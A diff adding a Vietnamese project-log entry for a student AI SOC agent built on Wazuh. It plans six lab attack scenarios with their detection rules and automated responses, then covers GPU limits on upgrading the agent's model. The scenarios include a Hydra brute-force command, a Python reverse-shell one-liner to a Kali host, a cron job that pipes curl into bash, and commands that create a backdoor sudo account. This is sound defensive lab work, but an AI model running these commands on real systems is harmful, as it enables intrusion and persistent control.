@@ -568,7 +568,174 @@ Chạy lệnh `python test_simulation.py` hoàn thành mỹ mãn 100% các bư�
   - Tinh gọn `cli.py`: Bỏ lệnh phụ `mock-alert`, tập trung 100% vào các lệnh tác chiến thực tế (`listen`, `scan`, `investigate`, `firewall`, `block`, `unblock`, `test-email`, `ui`, `test`).
 - **Đồng bộ toàn diện:**
   - 54 unit tests tiếp tục đạt 100% PASS.
-  - Cập nhật tài liệu `README.md` và khởi tạo tài liệu báo cáo tuần chính thức `BAO_CAO_TUAN_3.md` phục vụ báo cáo giảng viên hướng dẫn (Tuần 3).
+  - Cập nhật tài liệu `README.md` và khởi tạo tài liệu báo cáo tuần chính thức `BAO_CAO_TUAN_3.md` và `BAO_CAO_TUAN_5.md`.
+
+---
+
+### 🚀 PHIÊN LÀM VIỆC 17 (SESSION 17 - TUẦN 5 - 07/11/2026): MỞ RỘNG BẢN ĐỒ KỊCH BẢN TẤN CÔNG THỰC TẾ (MULTI-STAGE CYBER KILL CHAIN) & PHÂN TÍCH KHÓ KHĂN NÂNG CẤP MODEL QWEN3:4B
+
+#### 1. Động Lực: Chuyển Dịch Từ "Chỉ Canh Brute-Force" Sang "Hệ Thống Giám Sát SOC Toàn Diện"
+- **Nhận định cốt lõi:** Một hệ thống SOC thực thụ không bao giờ chỉ dừng lại ở việc chặn SSH brute-force (đây chỉ là giai đoạn Initial Access). Sau khi kẻ tấn công vượt qua hoặc lọt vào máy chủ, chúng sẽ tiến hành chuỗi hành vi xâm nhập sâu (Cyber Kill Chain): Dò quét (Reconnaissance) $\rightarrow$ Mở Reverse Shell $\rightarrow$ Duy trì cửa sau (Persistence) $\rightarrow$ Leo thang đặc quyền (Privilege Escalation) $\rightarrow$ Sửa đổi tài khoản & file hệ thống (Defense Evasion).
+- **Yêu cầu đề tài:** Lên kế hoạch chi tiết tất cả các kịch bản tấn công thực tế có thể triển khai trên môi trường Lab (máy ảo Ubuntu 24.04 + Kali Linux) để sinh viên có thể thực hiện và đo đạc dần dần.
+
+---
+
+#### 2. Bản Đồ Các Kịch Bản Tấn Công Thực Tế Có Thể Triển Khai (Roadmap Làm Dần Dần)
+
+##### 🔴 KỊCH BẢN 1: SSH Brute-Force & Password Spraying (MITRE T1110)
+- **Trạng thái:** ✅ **Đã hoàn thiện & Sẵn sàng kiểm thử thực tế.**
+- **Mô tả hành vi:** Kẻ tấn công dùng từ điển dò mật khẩu tài khoản người dùng hoặc root qua SSH.
+- **Công cụ tấn công:** Hydra trên Kali Linux (`192.168.56.102`):
+  ```bash
+  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101 -t 4
+  ```
+- **Wazuh Detection Rules:**
+  - `Rule 5710` (Attempt to login using non-existent user - Level 5)
+  - `Rule 5712` (sshd: brute force trying to get access - Level 10)
+  - `Rule 5763` (sshd: brute force with existing user - Level 10)
+- **Phản ứng tự trị (AI SOC Agent):**
+  - Webhook tiếp nhận alert tức thời (<5ms).
+  - AI ReAct Agent bóc tách IP nguồn (`192.168.56.102`).
+  - Policy Engine thẩm định Whitelist $\rightarrow$ Chấp thuận.
+  - Active Defense gọi `/usr/local/sbin/soc-block-ip` cô lập IP trên UFW trong 15 phút.
+  - Notifier gửi email cảnh báo HTML về Gmail.
+
+---
+
+##### 🔴 KỊCH BẢN 2: Dò Quét & Trinh Sát Cổng Mạng (Reconnaissance / Port Scanning - MITRE T1046)
+- **Trạng thái:** ⏳ **Sẵn sàng triển khai.**
+- **Mô tả hành vi:** Kẻ tấn công sử dụng các kỹ thuật quét cổng (TCP SYN scan, Service Version Detection, OS Fingerprinting) để tìm kiếm dịch vụ có lỗ hổng.
+- **Công cụ tấn công:** Nmap trên Kali Linux:
+  ```bash
+  nmap -sS -sV -p- -T4 192.168.56.101
+  ```
+- **Wazuh Detection Rules:**
+  - `Rule 31101` / `Rule 40111` (Port scan detection, Multiple connection attempts in short time).
+- **Phản ứng tự trị (AI SOC Agent):**
+  - Fast-Path hoặc AI Agent nhận diện hành vi trinh sát hàng loạt.
+  - Policy Engine đánh giá mức độ rủi ro (Reconnaissance Phase).
+  - Tự động kích hoạt cơ chế Rate Limiting hoặc chặn IP tạm thời trên UFW để làm mù mắt kẻ tấn công.
+
+---
+
+##### 🔴 KỊCH BẢN 3: Khởi Tạo Reverse Shell & Kết Nối C2 (Execution & C2 - MITRE T1059.004, T1071)
+- **Trạng thái:** ⏳ **Sẵn sàng triển khai.**
+- **Mô tả hành vi:** Sau khi khai thác được lỗ hổng, kẻ tấn công bắt server mở một kết nối ngược (Outbound socket) về cổng nghe `4444` trên Kali Linux để điều khiển máy chủ từ xa mà không cần SSH.
+- **Cách thức thực thi trên Lab:**
+  - Trên Kali Linux: Lắng nghe kết nối: `nc -lvnp 4444`.
+  - Trên Ubuntu Server: Kẻ tấn công kích hoạt Reverse Shell (qua Python/Bash/Netcat):
+    ```bash
+    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+    ```
+- **Wazuh Detection & Telemetry:**
+  - Wazuh Syscollector / Auditd ghi nhận tiến trình lạ mở socket ra IP bên ngoài hoặc lệnh `/bin/sh` gắn vào descriptor mạng.
+  - Auditd Rules: Giám sát lệnh gọi hệ thống `execve` với tham số kết nối mạng.
+- **Phản ứng tự trị (AI SOC Agent):**
+  - Agent gọi công cụ `inspect_active_processes` và `inspect_network_connections`.
+  - AI ReAct phát hiện tiến trình Python đang mở socket ngoại vi kết nối về `192.168.56.102:4444`.
+  - Đánh giá mức độ: **CRITICAL** (Active Compromise).
+  - Policy Engine phê duyệt ngắt kết nối và cô lập IP C2 của Kali qua UFW.
+
+---
+
+##### 🔴 KỊCH BẢN 4: Cấy Cửa Sau Lập Lịch Ẩn (Crontab Persistence - MITRE T1053.003)
+- **Trạng thái:** ⏳ **Sẵn sàng triển khai.**
+- **Mô tả hành vi:** Kẻ tấn công cấy mã độc hoặc script tự động chạy định kỳ trong `/etc/cron.d/` để duy trì quyền kiểm soát vĩnh viễn (kể cả sau khi reboot máy).
+- **Cách thức thực thi trên Lab:**
+  - Kẻ tấn công chèn tác vụ độc hại:
+    ```bash
+    echo "*/10 * * * * root curl -s http://192.168.56.102/backdoor.sh | bash" | sudo tee /etc/cron.d/sys_health_check
+    ```
+- **Wazuh Detection Rules:**
+  - `Rule 550` (FIM - Integrity checksum changed on `/etc/cron.d/` hoặc `/etc/crontab`).
+- **Phản ứng tự trị (AI SOC Agent):**
+  - Webhook nhận alert FIM Rule 550 từ Wazuh.
+  - Agent kích hoạt công cụ `inspect_cron_persistence`.
+  - Bóc tách nội dung tệp cron mới tạo, phát hiện hành vi tải và thực thi shell trái phép (`curl | bash`).
+  - Kết luận: `malicious_activity_likely`, Severity: `high`, khuyến nghị xóa bỏ file crontab độc hại và cô lập IP nguồn.
+
+---
+
+##### 🔴 KỊCH BẢN 5: Lạm Quyền Sudo & Thoát Shell GTFOBins (Privilege Escalation - MITRE T1548.003)
+- **Trạng thái:** ⏳ **Sẵn sàng triển khai.**
+- **Mô tả hành vi:** Tài khoản người dùng thường lợi dụng cấu hình `sudoers` hoặc nhập sai mật khẩu sudo dồn dập, hoặc lạm dụng các binaries như `sudo vi`, `sudo find`, `sudo less` để bẻ khóa thoát ra shell root (kỹ thuật GTFOBins).
+- **Cách thức thực thi trên Lab:**
+  - User thường chạy lệnh: `sudo -S id` với mật khẩu sai nhiều lần.
+  - Hoặc cố tình chạy các lệnh cấm: `sudo su -` hoặc `sudo bash`.
+- **Wazuh Detection Rules:**
+  - `Rule 5401` (sudo: Failed attempt to run sudo - Level 5)
+  - `Rule 5404` (sudo: 3 failed attempts to run sudo - Level 10)
+  - `Rule 5405` (sudo: user NOT in sudoers executed command - Level 5/7)
+- **Phản ứng tự trị (AI SOC Agent):**
+  - Nhận alert từ Wazuh $\rightarrow$ phân tích danh tính user.
+  - So sánh với danh sách `allowed_sudo_members` trong `config/baseline.json`.
+  - Nếu tài khoản vi phạm baseline $\rightarrow$ Kết luận `malicious_activity_likely`, gửi báo cáo khẩn cấp qua Gmail và ghi vết kiểm toán.
+
+---
+
+##### 🔴 KỊCH BẢN 6: Can Thiệp Trái Phép Tài Khoản Hệ Thống (Account Tampering - MITRE T1136.001)
+- **Trạng thái:** ⏳ **Sẵn sàng triển khai.**
+- **Mô tả hành vi:** Hacker tạo tài khoản backdoor bí mật trên máy chủ để biến thành tài khoản quản trị hợp pháp nhằm né tránh phòng vệ.
+- **Cách thức thực thi trên Lab:**
+  ```bash
+  sudo useradd -m -s /bin/bash backup_svc
+  sudo usermod -aG sudo backup_svc
+  ```
+- **Wazuh Detection Rules:**
+  - `Rule 5901` (pam: New account created - Level 8)
+  - `Rule 5902` (pam: User added to group - Level 8)
+  - `Rule 550` (FIM: `/etc/passwd` và `/etc/group` bị sửa đổi)
+- **Phản ứng tự trị (AI SOC Agent):**
+  - Agent gọi công cụ `inspect_user_changes`, đối chiếu tập user trên hệ thống với `baseline.json`.
+  - Phát hiện `backup_svc` là tài khoản lạ chưa từng được cấp phép.
+  - Kết luận vi phạm tính toàn vẹn hệ thống mức độ Critical $\rightarrow$ Đề xuất khóa tài khoản ngay lập tức.
+
+---
+
+#### 3. BẢNG GHI NHẬN KHÓ KHĂN ĐANG GẶP PHẢI: NÂNG CẤP CON AGENT TỪ QWEN3:4B
+
+##### 3.1 Bản chất vấn đề & Giới hạn phần cứng (Hardware Bottleneck)
+Hiện tại, AI SOC Agent đang vận hành ổn định trên mô hình **Ollama SLM `qwen3:4b`** với thời gian suy luận ~9 giây. Tuy nhiên, khi chuyển sang xử lý các kịch bản tấn công phức tạp (chuỗi ReAct nhiều bước, phân tích log đa nguồn, giải mã mã độc obfuscated), việc nâng cấp lên các mô hình tham số lớn hơn (7B – 8B) gặp phải những rào cản kỹ thuật nghiêm trọng:
+
+1. **Giới hạn bộ nhớ đồ họa (VRAM Bottleneck):**
+   - Card đồ họa máy trạm: **NVIDIA GeForce RTX 3050 Laptop chỉ có 4GB VRAM**.
+   - Các mô hình 7B/8B (như `qwen2.5:7b-instruct`, `deepseek-r1:7b`, `llama3.1:8b`) ở định dạng lượng tử hóa tiêu chuẩn 4-bit (Q4_K_M) yêu cầu tối thiểu **5.5 GB – 6.5 GB VRAM** chỉ để nạp mô hình, chưa tính bộ nhớ đệm ngữ cảnh (KV Cache).
+   - Khi chạy trên GPU 4GB, Ollama buộc phải tự động **chia cắt (offload) một nửa số layer sang RAM và CPU**.
+2. **Sụt giảm tốc độ suy luận nghiêm trọng (Latency Spike & Timeout):**
+   - Khi mô hình bị offload sang CPU/RAM, tốc độ sinh token tụt từ ~45 tokens/s xuống chỉ còn **8 – 12 tokens/s**.
+   - Thời gian cho một lượt ReAct Agent tăng vọt từ 9s lên **40 – 70 giây**, dễ dàng chạm ngưỡng timeout của HTTP client (`httpx.TimeoutException`).
+3. **Hiện tượng bùng nổ chuỗi tư duy (Chain-of-Thought `<think>` Overhead):**
+   - Các mô hình suy luận thế hệ mới (như `deepseek-r1:7b` hoặc `qwen2.5`) có cơ chế tự động sinh từ 1,000 đến 2,000 token văn bản nháp (`<think>...</think>`) trước khi bắt đầu tạo JSON kết luận.
+   - Trên GPU 4GB, việc sinh 1,500 token nháp có thể mất tới **2 đến 3 phút**, khiến giao diện web bị đơ (freeze) và làm chậm chu trình điều phối phản ứng tự trị (MTTR).
+4. **Cạnh tranh tài nguyên trên một máy duy nhất:**
+   - Máy Host (16GB RAM) đang phải gánh đồng thời: Máy ảo Ubuntu (4GB RAM) chạy cụm Wazuh Manager + Indexer + Dashboard, máy Host Windows 11, VS Code, trình duyệt và Ollama Server.
+
+##### 3.2 Hướng Nghiên Cứu & Giải Pháp Khắc Phục Đang Thử Nghiệm
+Để giải quyết bài toán nâng cấp mô hình trên phần cứng hạn chế mà không làm chậm hệ thống, các hướng tiếp cận sau đang được triển khai:
+
+* **Phương án 1: Lượng tử hóa cực sâu (Deep Quantization - GGUF IQ3_XS / Q3_K_M):**
+  - Thử nghiệm các bản build GGUF mức 3-bit của `qwen2.5:7b` hoặc `deepseek-r1:7b`. Dung lượng nạp giảm xuống còn **~3.6 GB**, có thể vừa khít trong 4GB VRAM của RTX 3050.
+* **Phương án 2: Kiến trúc Hybrid 2 Tầng (Cascaded Multi-Model Architecture):**
+  - *Tầng 1 (Triage & Phản ứng nhanh):* Giữ nguyên `qwen3:4b` nạp 100% trong GPU để phản ứng tức thời (< 9s) với 90% cảnh báo thông thường (Brute force, Sudo fail, Scan).
+  - *Tầng 2 (Deep Forensic):* Chỉ kích hoạt mô hình lớn 7B (hoặc gọi qua API chuyên sâu) đối với các ca điều tra nghi ngờ cao (`suspicious_needs_more_data`) có liên quan đến Reverse Shell hoặc FIM Backdoor.
+* **Phương án 3: Áp dụng Kỹ thuật Assistant Prefill & Khóa Cứng Token Budget:**
+  - Kế thừa giải pháp đã thành công ở Phiên 10: Nhồi sẵn `{"role": "assistant", "content": "{\n"}` để ép mô hình bỏ qua thẻ `<think>`, khóa cứng `max_tokens: 350` để đảm bảo thời gian sinh JSON luôn dưới 10 giây.
+
+---
+
+#### 4. Bảng Kế Hoạch Triển Khai Thực Nghiệm Theo Từng Giai Đoạn
+
+- [x] **Giai đoạn 1 (Đã hoàn tất):** Xây dựng Core ReAct Agent, Policy Engine, UFW Safe Wrapper, Giao diện 100vh và tích hợp Event-Driven Webhook với Wazuh SIEM 4.9.2.
+- [x] **Giai đoạn 2 (Đã hoàn tất):** Chuẩn hóa kiến trúc Zero-Trust (loại bỏ SSH đọc log endpoint), xây dựng công cụ `query_wazuh_history` tra cứu lịch sử tập trung từ Wazuh SIEM.
+- [ ] **Giai đoạn 3 (Tuần 5 - Trọng tâm hiện tại):**
+  - [ ] Thực hiện bài test tấn công thực tế Kịch bản 1 (SSH brute-force bằng Hydra từ Kali Linux) và chụp bộ 4 ảnh minh chứng thực nghiệm.
+  - [ ] Bật lưu trữ JSON archive trên Wazuh Manager (`<jsonout_output>yes</jsonout_output>`) để phục vụ tra cứu lịch sử đầy đủ.
+- [ ] **Giai đoạn 4 (Tuần 6):**
+  - [ ] Triển khai Kịch bản 3 (Reverse Shell) và Kịch bản 4 (Crontab Persistence).
+  - [ ] Thử nghiệm lượng tử hóa GGUF Q3 cho mô hình 7B trên GPU RTX 3050.
+- [ ] **Giai đoạn 5 (Tuần 7 & Hoàn thiện):**
+  - [ ] Chạy Benchmark 40 kịch bản, trích xuất ma trận nhầm lẫn (Confusion Matrix).
+  - [ ] Hoàn thiện toàn bộ số liệu thực nghiệm vào Báo cáo Đồ án và Slide bảo vệ.
 
 ---
 *Tài liệu này luôn được cập nhật đồng bộ với mã nguồn thực tế của dự án.*
